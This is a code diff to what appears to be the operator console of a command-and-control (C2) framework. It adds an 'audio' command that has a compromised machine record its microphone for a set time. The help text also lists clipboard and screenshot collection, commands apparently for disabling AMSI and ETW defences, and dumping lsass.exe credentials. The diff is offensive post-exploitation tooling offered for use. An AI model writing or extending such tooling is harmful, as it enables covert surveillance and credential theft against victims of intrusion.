@@ -38,6 +38,7 @@ agent_completer = NestedCompleter.from_nested_dict({
     'software': None,
     'clipboard': None,
     'screenshot': None,
+    'audio': None,
     'unhook': None,
     'amsi': None,
     'etw': None,
@@ -166,6 +167,7 @@ def print_agent_help():
     --== Collection Stuff ==--
     clipboard                              ->  retrieve clipboard
     screenshot                             ->  retrieve screenshot
+    audio <record-time>                    ->  record audio 
     
     --== Post Exploitation Stuff ==--
     lsass <method>                         ->  dump lsass.exe [methods:  direct,comsvcs] (elevation required)
@@ -297,6 +299,13 @@ def agent_screen(agent_id):
             elif re.fullmatch(r"\s*screenshot\s*", command):
                 command_dict = {
                     "command_type": "screenshot"
+                }
+
+            elif re.fullmatch(r"\s*audio\s+\d+\s*", command):
+                record_time = int(re.sub(r"\s*audio\s+", "", command, 1))
+                command_dict = {
+                    "command_type": "audio",
+                    "record_time": record_time,
                 }
 
             elif re.fullmatch(r"\s*lsass\s+(direct|comsvcs)", command):
